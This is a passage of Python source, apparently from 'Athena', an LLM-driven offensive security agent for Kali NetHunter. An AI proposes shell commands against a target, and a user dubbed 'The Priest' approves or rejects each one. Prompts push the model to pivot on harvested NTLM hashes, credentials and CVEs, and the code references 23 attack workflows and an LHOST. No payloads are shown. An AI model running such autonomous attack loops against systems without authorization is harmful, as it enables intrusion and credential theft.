                    "DO NOT repeat it. Take a different approach to advance the mission. "
                    "[THOUGHT] and [CMD]."
                )
                continue
            
            self.command_history.append(cmd_normalized)
            if len(self.command_history) > 20:
                self.command_history = self.command_history[-20:]
            
            output = self.run_command(cmd)
            
            if output == "SESSION_EXIT":
                print("\n\033[35m   ATHENA:\033[0m Session ended by The Priest.")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                sys.exit(0)
            
            if output == "INTERACTIVE_BLOCKED":
                is_interactive, fix = self._is_interactive(cmd)
                prompt = (
                    f"That command would hijack the terminal. {fix} "
                    f"Provide non-interactive alternative with [THOUGHT] and [CMD]."
                )
                continue
            
            if output == "COMMAND_REJECTED":
                self.stuck_counter += 1  # FIXED: Increment on reject
                if self.stuck_counter >= 3:
                    self.stuck_counter = 0
                    self._handle_stuck()
                    break
                
                try:
                    raw = input(
                        "\n\033[35m   ATHENA:\033[0m Alternative approach? [y/n]: "
                    )
                except (EOFError, KeyboardInterrupt):
                    break
                if self._normalize_choice(raw) == "y":
                    prompt = (
                        "The Priest rejected that. "
                        "Different approach to same goal. [THOUGHT] and [CMD]."
                    )
                    continue
                else:
                    break
            
            # Success — reset stuck counter
            self.stuck_counter = 0
            
            pivot = ""
            pivotable = {
                k: v for k, v in self.findings.items()
                if v and k in ("user","hash_ntlm","hash","cred","cve","port","ip","exposed_path")
            }
            if pivotable:
                pivot = "\nACTIONABLE FINDINGS:\n"
                for k, v in pivotable.items():
                    unique = list(dict.fromkeys(v))[-4:]
                    pivot += f"  {k.upper()}: {', '.join(str(x) for x in unique)}\n"
            
            prompt = (
                f"TERMINAL OUTPUT:\n{output}{pivot}\n\n"
                "Analyze with elite reasoning in [THOUGHT]. "
                "Pivot on findings. "
                "WORKFLOW_COMPLETE if done, else next [CMD]."
            )

    # ── Workflows ─────────────────────────────────────────────

    def _resolve_target(self) -> str:
        target = self.target_info.get("ip") or self.target_info.get("domain") or ""
        if not target:
            try:
                target = input("\033[90m   Enter target: \033[0m").strip()
            except (EOFError, KeyboardInterrupt):
                target = ""
        return target

    def run_workflow(self, key: str):
        wf = WORKFLOWS[key]
        print(f"\n\033[35m   ATHENA:\033[0m {wf['name']}...\n")
        self._log(f"[WORKFLOW] {wf['name']}")
        target = self._resolve_target()
        if not target:
            print("\033[31m   No target.\033[0m")
            return
        prompt = wf["prompt"].format(target=target)
        self._agent_loop(prompt, workflow_key=key)

    def show_workflow_menu(self):
        print("\n\033[35m   ATHENA:\033[0m Workflows:\n")
        for k, wf in WORKFLOWS.items():
            print(f"   \033[97m[{k:>2}]\033[0m  {wf['name']}")
            print(f"          \033[90m{wf['description']}\033[0m")
        print(f"\n   \033[97m[ 0]\033[0m  Cancel\n")
        try:
            choice = input("\033[90m   Select: \033[0m").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if choice in WORKFLOWS:
            self.run_workflow(choice)
        elif choice != "0":
            print("\033[33m   Invalid.\033[0m")

    # ── Stuck Recovery (FIXED) ────────────────────────────────

    def _handle_stuck(self):
        """FIXED: Now actually called when stuck_counter hits 3."""
        print("\n\033[33m   ⚠  Athena is stuck. Asking AI for 3 alternative approaches...\033[0m")
        
        findings_summary = []
        for k, v in self.findings.items():
            if v:
                findings_summary.append(f"{k}={list(dict.fromkeys(v))[-3:]}")
        
        prompt = (
            "You have hit a wall. The Priest has rejected/aborted 3 commands. "
            f"Current findings: {' | '.join(findings_summary) if findings_summary else 'minimal'}. "
            "Output ONLY this format:\n"
            "[OPTIONS]\n"
            "1. <approach 1 — one line>\n"
            "2. <approach 2 — one line>\n"
            "3. <approach 3 — one line>\n"
            "[/OPTIONS]\n"
            "Each must take a fundamentally different angle (e.g. enum vs exploit vs creds vs pivot)."
        )
        
        response = self._think_with_fallback([
            {"role": "system", "content": "You are Athena, presenting 3 approaches when stuck."},
            {"role": "user", "content": prompt}
        ])
        
        if not response:
            print("\033[31m   AI unavailable. Type your own next objective.\033[0m")
            return
        
        opt_match = re.search(r'\[OPTIONS\](.*?)\[/OPTIONS\]', response, re.DOTALL)
        options_text = opt_match.group(1).strip() if opt_match else response
        
        print(f"\n\033[35m   ATHENA — 3 ALTERNATIVES:\033[0m\n")
        print(f"\033[97m{options_text}\033[0m\n")
        
        try:
            choice = input("\033[90m   Pick [1/2/3] or type your own objective: \033[0m").strip()
        except (EOFError, KeyboardInterrupt):
            return
        
        if choice in ("1", "2", "3"):
            lines = options_text.split('\n')
            for line in lines:
                if line.strip().startswith(choice + "."):
                    new_objective = line.split('.', 1)[1].strip()
                    print(f"\033[32m   Pursuing: {new_objective}\033[0m")
                    self._agent_loop(new_objective)
                    return
        elif choice:
            self._agent_loop(choice)

    # ── Findings ──────────────────────────────────────────────

    def show_findings(self):
        has_any = any(v for v in self.findings.values())
        if not has_any:
            print("\n\033[90m   No findings yet.\033[0m\n")
            return
        print("\n\033[35m   FINDINGS:\033[0m\n")
        for key, vals in self.findings.items():
            if vals:
                unique = list(dict.fromkeys(vals))
                print(f"   \033[97m{key.upper()}:\033[0m")
                for v in unique[-10:]:
                    print(f"      \033[90m- {v}\033[0m")
        print()

    # ── Report ────────────────────────────────────────────────

    def _generate_report(self):
        ts = datetime.datetime.now()
        duration = ts - self.session_start
        rpath = os.path.join(
            LOG_DIR,
            f"report_{self.session_start.strftime('%Y%m%d_%H%M%S')}.txt"
        )
        try:
            with open(rpath, "w") as f:
                f.write(f"ATHENA v{VERSION} REPORT\n{'='*60}\n")
                f.write(f"Duration: {str(duration).split('.')[0]}\n")
                t_str = " | ".join(filter(None, [
                    self.target_info.get("ip",""),
                    self.target_info.get("domain","")
                ]))
                f.write(f"Target: {t_str or 'Not set'}\n")
                f.write(f"LHOST: {self.lhost}\n\n")
                f.write("FINDINGS\n" + "-"*60 + "\n")
                for key, vals in self.findings.items():
                    if vals:
                        f.write(f"\n{key.upper()}:\n")
                        for v in list(dict.fromkeys(vals)):
                            f.write(f"  - {v}\n")
                f.write(f"\n{'='*60}\nEND\n")
            print(f"\n\033[32m   Report: {rpath}\033[0m")
        except Exception as e:
            print(f"\033[33m   Report failed: {e}\033[0m")

    def save_session(self):
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(LOG_DIR, f"save_{ts}.txt")
        try:
            with open(path, "w") as f:
                f.write(f"ATHENA SAVE {ts}\n{'='*60}\n\n")
                for msg in self.history:
                    f.write(f"[{msg['role'].upper()}]\n{msg['content']}\n\n")
            print(f"\033[32m   Saved: {path}\033[0m")
        except Exception as e:
            print(f"\033[31m   Save failed: {e}\033[0m")

    # ── Help & Status ─────────────────────────────────────────

    def _current_provider_name(self) -> str:
        if 0 <= self.provider_index < len(PROVIDER_CHAIN):
            return PROVIDER_CHAIN[self.provider_index][2]
        return "Unknown"

    def _handle_remember(self, raw_input: str):
        remember_file = os.path.join(INSTALL_DIR, "remembered.txt")
        text = raw_input[len("remember"):].strip()
        
        if not text:
            important = []
            for k in ("ip", "port", "user", "hash_ntlm", "hash", "cred", "cve", "exposed_path"):
                vals = self.findings.get(k, [])
                if vals:
                    unique = list(dict.fromkeys(vals))[-5:]
                    important.append(f"{k}: {', '.join(str(v) for v in unique)}")
            if not important:
                print("\033[33m   Nothing important to remember yet.\033[0m")
                return
            text = " | ".join(important)
        
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
        target = self.target_info.get("ip") or self.target_info.get("domain") or "general"
        entry = f"[{ts}] [{target}] {text}"
        
        try:
            with open(remember_file, "a") as f:
                f.write(entry + "\n")
            self.remembered.append(entry)
            print(f"\033[32m   Remembered: {text[:80]}{'...' if len(text)>80 else ''}\033[0m")
        except Exception as e:
            print(f"\033[31m   Save failed: {e}\033[0m")

    def _handle_recall(self):
        remember_file = os.path.join(INSTALL_DIR, "remembered.txt")
        if not os.path.exists(remember_file):
            print("\033[33m   Nothing remembered yet. Use 'remember' to save facts.\033[0m")
            return
        
        try:
            with open(remember_file) as f:
                lines = [l.strip() for l in f if l.strip()]
        except Exception as e:
            print(f"\033[31m   Read failed: {e}\033[0m")
            return
        
        if not lines:
            print("\033[33m   Nothing remembered yet.\033[0m")
            return
        
        target = self.target_info.get("ip") or self.target_info.get("domain")
        relevant = [l for l in lines if target and target in l] or lines
        
        print(f"\n\033[35m   REMEMBERED ({len(relevant)} entries):\033[0m")
        for entry in relevant[-15:]:
            print(f"   \033[90m• {entry}\033[0m")
        
        if relevant:
            context = "\n".join(relevant[-10:])
            self.history.insert(0, {
                "role": "user",
                "content": f"PREVIOUSLY REMEMBERED FACTS (use these, do not re-discover):\n{context}"
            })
            self.history.insert(1, {
                "role": "assistant",
                "content": "[CMD]ACK[/CMD]"
            })
            print(f"\033[32m   Loaded into AI context.\033[0m\n")

    def _show_tools_status(self):
        print("\n\033[35m   TOOL AVAILABILITY:\033[0m\n")
        for tool in EXPECTED_TOOLS:
            if tool not in self.tools_available:
                self.tools_available[tool] = cmd_exists(tool)
        
        cols = 3
        items = list(self.tools_available.items())
        rows = (len(items) + cols - 1) // cols
        for r in range(rows):
            row_items = items[r::rows][:cols]
            line = "   "
            for tool, present in row_items:
                mark = "\033[32m✓\033[0m" if present else "\033[31m✗\033[0m"
                line += f"{mark} {tool:<18}"
            print(line)
        print()
        
        missing = [t for t, p in self.tools_available.items() if not p]
        if missing:
            try:
                ans = input(f"\033[33m   Install {len(missing)} missing tools? [y/n]: \033[0m")
            except (EOFError, KeyboardInterrupt):
                return
            if self._normalize_choice(ans) == "y":
                for t in missing:
                    install_if_missing(t)
                    self.tools_available[t] = cmd_exists(t)

    def show_help(self):
        print(
            f"\n\033[35m   ATHENA v{VERSION}\033[0m\n"
            f"   Model  : \033[97m{self._current_provider_name()}\033[0m\n"
            f"   LHOST  : \033[97m{self.lhost}\033[0m\n\n"
            "   \033[97mworkflow\033[0m  23 attack workflows\n"
            "   \033[97mtarget\033[0m    Set or update target\n"
            "   \033[97mfindings\033[0m  Show extracted findings\n"
            "   \033[97mremember\033[0m  Save important findings (persistent)\n"
            "   \033[97mrecall\033[0m    Load remembered facts into AI\n"
            "   \033[97mtools\033[0m     Show tool availability + auto-install missing\n"
            "   \033[97msave\033[0m      Save conversation to file\n"
            "   \033[97mreport\033[0m    Generate report now\n"
            "   \033[97mmodel\033[0m     Show current provider and full chain\n"
            "   \033[97mclear\033[0m     Reset AI memory (findings kept)\n"
            "   \033[97mhelp\033[0m      This menu\n"
            "   \033[97mexit/q\033[0m    End session + report\n\n"
            "   \033[90mOr type any objective in plain English.\033[0m\n"
        )

    def show_model_status(self):
        print("\n\033[35m   PROVIDER CHAIN:\033[0m\n")
        for i, (provider, model, name) in enumerate(PROVIDER_CHAIN):
            active = " ◀ ACTIVE" if i == self.provider_index else ""
            avail = "✅" if (
                (provider == "cerebras" and self.cerebras_client and not self.cerebras_disabled) or
                (provider == "groq" and self.groq_client)
            ) else "❌"
            print(f"   {avail} [{i+1}] {name}{active}")
        print()

    # ── REPL ──────────────────────────────────────────────────

    def repl(self):
        print(BANNER)
        self.set_target()
        self.show_help()
        
        while True:
            try:
                user_input = input("\033[35m[PRIEST]\033[0m > ").strip()
            except (EOFError, KeyboardInterrupt):
                print("\n\033[35m   ATHENA:\033[0m Session ended.\n")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                break
            
            if not user_input:
                continue
            
            self._log(f"[PRIEST] {user_input}")
            cmd = user_input.lower()
            
            if cmd in ("exit", "quit", "q"):
                print("\n\033[35m   ATHENA:\033[0m Generating report...\n")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                break
            elif cmd == "help":
                self.show_help()
            elif cmd == "workflow":
                self.show_workflow_menu()
            elif cmd == "target":
                self.set_target()
            elif cmd == "findings":
                self.show_findings()
            elif cmd == "save":
                self.save_session()
            elif cmd == "report":
                self._generate_report()
            elif cmd == "model":
                self.show_model_status()
            elif cmd == "clear":
                self.history.clear()
                self.current_workflow_key = None
                print("\033[90m   Memory cleared. Findings preserved.\033[0m")
            elif cmd == "remember" or cmd.startswith("remember "):
                self._handle_remember(user_input)
            elif cmd == "recall":
                self._handle_recall()
            elif cmd == "tools":
                self._show_tools_status()
            else:
                self._agent_loop(user_input, workflow_key=None)


# ─────────────────────────────────────────────────────────────
# BANNER
# ─────────────────────────────────────────────────────────────

BANNER = """\033[35m
 █████╗ ████████╗██╗  ██╗███████╗███╗   ██╗ █████╗
██╔══██╗╚══██╔══╝██║  ██║██╔════╝████╗  ██║██╔══██╗
███████║   ██║   ███████║█████╗  ██╔██╗ ██║███████║
██╔══██║   ██║   ██╔══██║██╔══╝  ██║╚██╗██║██╔══██║
██║  ██║   ██║   ██║  ██║███████╗██║ ╚████║██║  ██║
╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝
\033[0m\033[90m        AI Offensive Security Agent v6.1
           Commander: The Priest | Kali NetHunter
     Auto-Exploit | Persistent State | Stuck Recovery\033[0m
"""


if __name__ == "__main__":
    session = AthenaSession()
    session.repl()
